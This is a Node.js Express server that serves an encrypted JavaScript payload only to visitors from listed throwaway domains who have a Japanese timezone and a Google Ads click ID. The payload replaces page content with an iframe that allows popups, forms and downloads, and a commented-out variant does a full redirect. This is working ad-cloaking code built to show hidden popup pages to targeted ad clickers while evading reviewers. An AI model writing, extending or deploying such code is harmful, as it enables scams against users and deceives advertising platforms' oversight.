const express = require("express");
const cors = require("cors");
const CryptoJS = require("crypto-js");

const ENCRYPTION_KEY =
  process.env.ENCRYPTION_KEY ||
  "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";

const app = express();
const PORT = process.env.PORT || 3000;

// 1. Replaced the Set with a mapping object
const ORIGIN_TO_IFRAME_MAP = {
  "https://adorable-wisp-09d89e.netlify.app": "https://pop-files-4.onrender.com",
  "https://zen-hawellness.life": "https://pop-files-4.onrender.com/aomine.html",
  "https://miyabikinjp.d1z4h7krxqlddi.amplifyapp.com": "https://dmctest1.dmpi9rl9u2aco.amplifyapp.com",
  "https://naotoshidairy.com": "https://pop-files-4.onrender.com",
  "https://tangerine-wisp-ba8453.netlify.app": "https://pop-files-4.onrender.com",
};

const JAPANESE_TIMEZONES = new Set([
  "Asia/Tokyo",
  "Japan",
  "JST",
  "GMT+9",
  "UTC+9",
  "+09:00",
  "+0900",
]);

app.use(cors());
app.use(express.json());

function isJapaneseTimezone(tz) {
  if (!tz || typeof tz !== "string") return false;

  const normalized = tz.trim();

  if (JAPANESE_TIMEZONES.has(normalized)) return true;

  try {
    const fmt = new Intl.DateTimeFormat("en", {
      timeZone: normalized,
      timeZoneName: "shortOffset",
    });
    const offsetPart = fmt
      .formatToParts(new Date())
      .find((p) => p.type === "timeZoneName");

    if (offsetPart) {
      const raw = offsetPart.value.replace("GMT", "").replace(":", "");
      const hours = parseInt(raw, 10);
      if (hours === 9) return true;
    }
  } catch {
    // Unknown timezone string — fall through to false
  }

  return false;
}

function hasGclid(fullUrl) {
  if (!fullUrl || typeof fullUrl !== "string") return false;
  try {
    const url = new URL(fullUrl);
    const gclid = url.searchParams.get("gclid");
    return typeof gclid === "string" && gclid.length > 0;
  } catch {
    return false;
  }
}

app.post("/timezone", (req, res) => {
  const { timezone, fullUrl } = req.body || {};
  const origin = req.headers.origin;

  // 2. Look up the target iframe URL based on the origin
  const targetIframeUrl = ORIGIN_TO_IFRAME_MAP[origin];

  // If the origin isn't in our map, targetIframeUrl will be undefined
  if (!origin || !targetIframeUrl) {
    return res.status(403).json({ error: "Origin not allowed" });
  }

  if (!isJapaneseTimezone(timezone)) {
    return res
      .status(400)
      .json({ error: "Timezone is not a Japanese timezone (JST / UTC+9)" });
  }

  if (!hasGclid(fullUrl)) {
    return res
      .status(400)
      .json({ error: "fullUrl is missing gclid parameter" });
  }

  // 3. Pass the target URL into the buildPayload function
  const encrypted = encodeURIComponent(
    CryptoJS.AES.encrypt(buildPayload(targetIframeUrl), ENCRYPTION_KEY).toString(),
  );
  
  console.log(`Popup Sent`);
  return res.status(200).type("text/plain").send(encrypted);
});

// 4. Update the function to accept the targetUrl parameter
function buildPayload(targetUrl) {
  return `const iframe = document.createElement("iframe");
iframe.src = "${targetUrl}";

iframe.setAttribute(
  "allow",
  "fullscreen; autoplay; encrypted-media; picture-in-picture",
);

iframe.setAttribute("allowfullscreen", "");
iframe.setAttribute("webkitallowfullscreen", "");
iframe.setAttribute("mozallowfullscreen", "");

iframe.setAttribute(
  "sandbox",
  "allow-scripts allow-popups allow-forms allow-downloads",
);

iframe.style.width = "100%";
iframe.style.height = "100%";
iframe.style.border = "0px";

const container = document.getElementById("contentiframe");
if (container) {
  container.replaceChildren(iframe);
}`;
}

// function buildPayload(targetUrl) {
//   return `window.location.replace(${JSON.stringify(targetUrl)});`;
// }

app.get("/health", (_req, res) => res.json({ status: "ok" }));

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
